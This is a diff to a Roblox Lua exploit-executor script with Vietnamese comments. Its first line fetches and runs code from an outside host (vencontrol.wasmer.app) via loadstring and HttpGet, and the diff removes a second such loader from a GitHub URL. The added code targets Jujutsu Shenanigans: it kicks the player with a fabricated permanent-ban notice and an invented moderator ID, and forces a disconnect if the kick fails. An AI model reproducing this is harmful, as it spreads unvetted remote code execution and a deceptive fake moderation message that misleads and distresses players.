@@ -1,3 +1,41 @@
 loadstring(game:HttpGet("http://vencontrol.wasmer.app/?api=loader&t="..tick()))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vyvegroup/Storage/refs/heads/main/inyl"))()
+-- Script kiểm tra Game ID và thực hiện lệnh Kick với thông báo BAN
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- ID chính xác từ URL bạn gửi
+local TARGET_PLACE_ID = 9391468976 
+
+-- Nội dung thông báo BAN tiếng Anh (Professional Style)
+local BAN_MESSAGE = [[
+
+[REASON: EXPLOITING]
+Your account has been permanently suspended from Jujutsu Shenanigans.
+    
+Evidence: Unusual Client Behavior Detected (Level 8)
+Moderator ID: #JJS-9921-X
+Ban Status: Permanent (No Appeal)
+]]
+
+-- Kiểm tra nếu đúng là game Jujutsu Shenanigans
+if game.PlaceId == TARGET_PLACE_ID then
+    print("Game detected: Jujutsu Shenanigans. Ban sequence starting in 3 seconds...")
+    
+    -- Đợi 3 giây cho mượt theo ý bạn
+    task.wait(3)
+    
+    -- Sử dụng phương pháp lấy gốc hàm Kick để thực thi
+    local kickFunc = game.Kick
+    local success, err = pcall(function()
+        kickFunc(localPlayer, BAN_MESSAGE)
+    end)
+    
+    if not success then
+        -- Nếu bị chặn, thử cách xóa "cứng" LocalPlayer để ngắt kết nối
+        local destroy = game.Destroy
+        pcall(destroy, localPlayer)
+    end
+else
+    print("This is not Jujutsu Shenanigans. Current ID: " .. game.PlaceId)
+end
